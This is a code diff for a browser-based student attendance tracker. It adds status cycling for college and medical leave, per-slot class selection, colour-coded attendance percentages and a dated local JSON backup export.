+            const schedule = defaultTimetable(dShort);
             const isToday = curr.toDateString() === todayStr;
-            const leaveType = localStorage.getItem(`${currentSection}-${dKey}-leave`) || 'none';
-
+            const status = localStorage.getItem(`${dKey}-status`) || 'normal';
             const row = document.createElement('tr');
             if (isToday) row.classList.add('today-row');
-            if (leaveType !== 'none') row.classList.add('row-' + leaveType);
+            if (status !== 'normal') row.classList.add('row-' + status);
 
-            let cells = `<td>
-                <b style="font-size:0.9rem">${curr.getDate()} ${curr.toLocaleDateString('en-GB',{month:'short'})}</b><br>
-                <select class="leave-select" onchange="setLeave('${dKey}', this.value)">
-                    <option value="none" ${leaveType==='none'?'selected':''}>Normal</option>
-                    <option value="cl" ${leaveType==='cl'?'selected':''}>CL</option>
-                    <option value="ml" ${leaveType==='ml'?'selected':''}>ML</option>
-                </select>
-            </td>`;
-            
+            let cellsBody = '';
             for (let i = 0; i < 7; i++) {
-                const sub = schedule ? schedule[i] : 'OFF';
-                const sKey = `${currentSection}-${dKey}-s${i}`;
-                const checked = localStorage.getItem(sKey) === 'true' ? 'checked' : '';
-                const disabled = (leaveType !== 'none' || !schedule) ? 'disabled' : '';
-                
-                cells += `<td>
-                    <div style="font-size:0.5rem; color:var(--subtext); margin-bottom:4px">${sub}</div>
-                    <input type="checkbox" data-sub="${sub}" ${checked} ${disabled} onchange="save('${dKey}', ${i}, this.checked)">
+                const sub = localStorage.getItem(`${dKey}-custom-${i}`) || schedule[i] || 'OFF';
+                const isChecked = localStorage.getItem(`${dKey}-s${i}`) === 'true';
+                cellsBody += `<td>
+                    <div class="custom-select-container">
+                        <div class="selected-box" onclick="toggleDropdown(this)">${sub}</div>
+                        <div class="dropdown-menu">
+                            ${CLASS_LIST.map(opt => `<div class="dropdown-item" onclick="changeClass('${dKey}', ${i}, '${opt}')">${opt}</div>`).join('')}
+                        </div>
+                    </div>
+                    <input type="checkbox" data-sub="${sub}" ${isChecked ? 'checked' : ''} ${(status !== 'normal' || sub === 'OFF') ? 'disabled' : ''} onchange="save('${dKey}', ${i}, this.checked)">
                 </td>`;
             }
-            cells += `<td><span id="p-${dKey}" class="badge">0%</span></td>`;
-            row.innerHTML = cells;
+            row.innerHTML = `<td><div style="font-size:0.7rem; font-weight:bold; color:var(--primary)">${dShort.toUpperCase()}</div><div style="font-size:0.9rem; font-weight:bold">${curr.getDate()} ${curr.toLocaleDateString('en-GB',{month:'short'})}</div><div class="status-pill" onclick="cycleStatus('${dKey}')">${status.toUpperCase()}</div></td>` + cellsBody + `<td><span id="p-${dKey}" class="badge">0%</span></td>`;
             tbody.appendChild(row);
             updateRowPerc(dKey);
             curr.setDate(curr.getDate() + 1);
@@ -202,58 +700,98 @@
         updateGlobalStats();
     }
 
-    function setLeave(date, type) {
-        localStorage.setItem(`${currentSection}-${date}-leave`, type);
-        render();
+    function toggleDropdown(el) { 
+        document.querySelectorAll('.dropdown-menu').forEach(d => { 
+            if(d !== el.nextElementSibling) d.classList.remove('open'); 
+        }); 
+        if (el.nextElementSibling) el.nextElementSibling.classList.toggle('open'); 
     }
-
-    function save(date, slot, val) {
-        localStorage.setItem(`${currentSection}-${date}-s${slot}`, val);
-        updateRowPerc(date);
-        updateGlobalStats();
+    
+    window.onclick = function(e) { 
+        if (!e.target.matches('.selected-box')) {
+            document.querySelectorAll('.dropdown-menu').forEach(d => d.classList.remove('open')); 
+        }
     }
-
-    function updateRowPerc(date) {
-        const leave = localStorage.getItem(`${currentSection}-${date}-leave`) || 'none';
-        const el = document.getElementById(`p-${date}`);
-        if (leave !== 'none') { el.innerText = "EXMPT"; return; }
+    
+    function cycleStatus(date) { 
+        const states = ['normal', 'college', 'medical']; 
+        const current = localStorage.getItem(`${date}-status`) || 'normal'; 
+        const nextState = states[(states.indexOf(current) + 1) % states.length];
+        localStorage.setItem(`${date}-status`, nextState); 
+        render(); 
+    }
+    
+    function changeClass(date, slot, val) { 
+        localStorage.setItem(`${date}-custom-${slot}`, val); 
+        render(); 
+    }
+    
+    function save(date, slot, val) { 
+        localStorage.setItem(`${date}-s${slot}`, val); 
+        updateRowPerc(date); 
+        updateGlobalStats(); 
+    }
+    
+    function updateRowPerc(date) { 
+        const status = localStorage.getItem(`${date}-status`) || 'normal'; 
+        const el = document.getElementById(`p-${date}`); 
+        if (!el) return;
         
-        const checks = Array.from(document.querySelectorAll(`input[onchange*="${date}"]`));
-        if (checks.length === 0 || checks[0].disabled) { el.innerText = "-"; return; }
-        const p = Math.round((checks.filter(c => c.checked).length / checks.length) * 100);
-        el.innerText = p + "%";
+        if (status !== 'normal') { 
+            el.innerText = "EXCL"; 
+            return; 
+        } 
+        
+        const checks = Array.from(document.querySelectorAll(`input[onchange*="${date}"]`)).filter(c => !c.disabled); 
+        if (checks.length === 0) { 
+            el.innerText = "-"; 
+            return; 
+        } 
+        const p = Math.round((checks.filter(c => c.checked).length / checks.length) * 100); 
+        el.innerText = p + "%"; 
+        el.style.color = p < 75 ? "var(--danger)" : "var(--success)"; 
     }
-
-    function updateGlobalStats() {
-        const subs = ['BCE', 'EM-II', 'PHY', 'BME', 'CS', 'CAMD', 'MPW', 'BCE Lab', 'PHY Lab', 'CRT', 'LANG'];
+    
+    function updateGlobalStats() { 
         const panel = document.getElementById('statsPanel');
-        panel.innerHTML = '';
+        if (!panel) return;
         
-        subs.forEach(s => {
-            const allPossible = Array.from(document.querySelectorAll(`input[data-sub="${s}"]`));
-            const activeCheckboxes = allPossible.filter(c => !c.disabled);
-            if (activeCheckboxes.length > 0) {
-                const p = Math.round((activeCheckboxes.filter(c => c.checked).length / activeCheckboxes.length) * 100);
-                panel.innerHTML += `<div class="sub-card"><span style="font-size:0.6rem">${s}</span><span class="sub-perc">${p}%</span></div>`;
-            }
-        });
+        panel.innerHTML = ''; 
+        TARGET_SUBS.forEach(s => { 
+            const all = Array.from(document.querySelectorAll(`input[data-sub="${s}"]`)); 
+            const valid = all.filter(c => { 
+                const match = c.getAttribute('onchange')?.match(/'([^']+)'/) ;
+                if (!match) return false;
+                const d = match[1]; 
+                return (localStorage.getItem(`${d}-status`) || 'normal') === 'normal'; 
+            }); 
+            const att = valid.filter(c => c.checked).length; 
+            const tot = valid.length; 
+            if (tot > 0) { 
+                const p = Math.round((att / tot) * 100); 
+                panel.innerHTML += `<div class="sub-card" style="border-bottom: 3px solid ${p < 75 ? 'var(--danger)' : 'var(--success)'}"><span style="font-size:0.6rem; color:var(--subtext)">${s}</span><span class="sub-perc">${p}%</span></div>`; 
+            } 
+        }); 
     }
-
-    function scrollToToday() {
-        const todayRow = document.querySelector('.today-row');
-        if (todayRow) todayRow.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    
+    function scrollToToday() { 
+        const r = document.querySelector('.today-row'); 
+        if (r) r.scrollIntoView({ behavior: 'smooth', block: 'center' }); 
     }
-
-    function exportData() {
-        const blob = new Blob([JSON.stringify(localStorage)], {type: 'application/json'});
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = `attendance_backup.json`;
-        a.click();
+    
+    function exportData() { 
+        const exportObj = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            exportObj[key] = localStorage.getItem(key);
+        }
+        
+        const blob = new Blob([JSON.stringify(exportObj, null, 2)], {type: 'application/json'}); 
+        const a = document.createElement('a'); 
+        a.href = URL.createObjectURL(blob); 
+        a.download = `wrath_os_backup_${new Date().toISOString().slice(0,10)}.json`; 
+        a.click(); 
     }
-
-    render();
-    setTimeout(scrollToToday, 800);
 </script>
 </body>
 </html>
